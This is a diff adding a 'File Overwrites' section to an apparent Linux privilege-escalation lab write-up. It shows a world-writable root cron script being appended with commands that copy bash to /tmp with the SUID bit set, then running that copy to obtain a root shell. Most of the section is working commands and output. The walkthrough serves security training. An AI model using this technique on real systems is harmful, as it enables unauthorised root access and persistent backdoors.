@@ -140,3 +140,35 @@ root
 
 ## File Overwrites
 
+Let's visit the `overwrite.sh` file again. If we check file permissions, we can see that anyone can write to the file.
+
+```bash
+TCM@debian:~$ locate overwrite.sh
+/usr/local/bin/overwrite.sh
+TCM@debian:~$ ls -l /usr/local/bin/overwrite.sh 
+-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
+```
+
+Since we can overwrite the file that is run by root, we can simply overwrite the file to create a reverse shell or in this case create a copy of `/bin/bash` with the SUID set.
+
+```bash
+TCM@debian:~$ echo 'cp /bin/bash /tmp/bash_o; chmod +s /tmp/bash_o;' >> /usr/local/bin/overwrite.sh 
+TCM@debian:~$ cat /usr/local/bin/overwrite.sh 
+#!/bin/bash
+
+echo `date` > /tmp/useless
+cp /bin/bash /tmp/bash_o; chmod +s /tmp/bash_o;
+```
+
+Now we simply need to wait till the cron job is run and the files is copied.
+
+```bash
+TCM@debian:~$ ls -l /tmp/
+total 1100
+-rw-r--r-- 1 root root 181517 Jun 12 19:53 backup.tar.gz
+-rwsr-sr-x 1 root root 926536 Jun 12 19:53 bash_o
+-rw-r--r-- 1 root root     29 Jun 12 19:53 useless
+TCM@debian:~$ /tmp/bash_o -p
+bash_o-4.1# whoami
+root
+```
